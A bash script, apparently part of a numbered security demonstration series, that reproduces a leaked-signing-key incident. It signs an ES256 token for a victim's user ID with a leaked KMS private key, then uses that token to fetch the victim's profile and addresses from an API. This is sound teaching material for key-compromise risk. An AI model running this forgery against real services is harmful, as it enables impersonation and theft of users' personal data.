#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────
# 07_forged_token.sh — 토큰 위조 시연 (쿠팡 사고 재현)
# ─────────────────────────────────────────────────────────────
# 역할:
#   - 유출된 KMS external import 개인키(.pem)로 임의 sub의 토큰을 로컬에서 서명
#   - 본인 계정/로그인 없이 victim의 sub만 박아 토큰 위조 → api-server는
#     KMS 공개키로 검증 통과 → /users/me 같은 정상 endpoint에서 victim 데이터 반환
#   - 04/05의 IDOR과는 다른 결: path 조작이 아니라 토큰 자체를 위조
#   - 인가가 완벽해도 뚫림 — 키 유출 단일 사고로 발생
#
# 사전 조건:
#   - pip install cryptography
#   - PRIV_KEY 환경변수에 .pem 경로 (또는 scripts/leaked_private_key.pem 위치)
#   - 진짜 KMS 키와 짝인 개인키여야 함 (external import 시 보관해둔 원본)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/env.sh"

PRIV_KEY="${PRIV_KEY:-$SCRIPT_DIR/leaked_private_key.pem}"

if [[ ! -f "$PRIV_KEY" ]]; then
    echo "SKIP: 개인키 파일 없음 — $PRIV_KEY"
    echo
    echo "쿠팡 사고 재현 시연은 KMS external import 키의 원본 개인키(.pem)가 필요합니다."
    echo "팀에 키 위치 확인 후 다음 중 하나로 지정:"
    echo "    PRIV_KEY=/path/to/key.pem ./07_forged_token.sh"
    echo "    또는 $SCRIPT_DIR/leaked_private_key.pem 에 위치"
    echo "(.pem은 .gitignore에 의해 자동 무시됨)"
    exit 0
fi

echo "[07] 토큰 위조 (쿠팡 사고 재현 — victim user_id=$VICTIM_USER_ID)"
echo "    유출 개인키로 sub=$VICTIM_USER_ID 박은 ES256 토큰을 로컬에서 서명"
echo "    → api-server는 KMS 공개키로 검증 통과 → 정상 발급 토큰과 구분 못 함"
echo

FORGED=$(python3 "$SCRIPT_DIR/forge_token.py" --priv "$PRIV_KEY" --sub "$VICTIM_USER_ID")
echo "  forged token: ${FORGED:0:60}..."
echo

echo "─── GET /users/me with forged token (sub=$VICTIM_USER_ID) ───"
curl -sS "$API_URL/users/me" -H "Authorization: Bearer $FORGED" | jq .
echo

echo "─── GET /addresses with forged token ───"
curl -sS "$API_URL/addresses" -H "Authorization: Bearer $FORGED" | jq .
echo

echo "★ 응답에 victim($VICTIM_USER_ID)의 데이터가 반환되면 위조 성공"
echo "  → 로그인/IDOR path 조작 없이도 타인 데이터 접근 가능"
echo "  → 인가 검증이 완벽해도 뚫림 — 키 유출 단일 원인으로 발생"
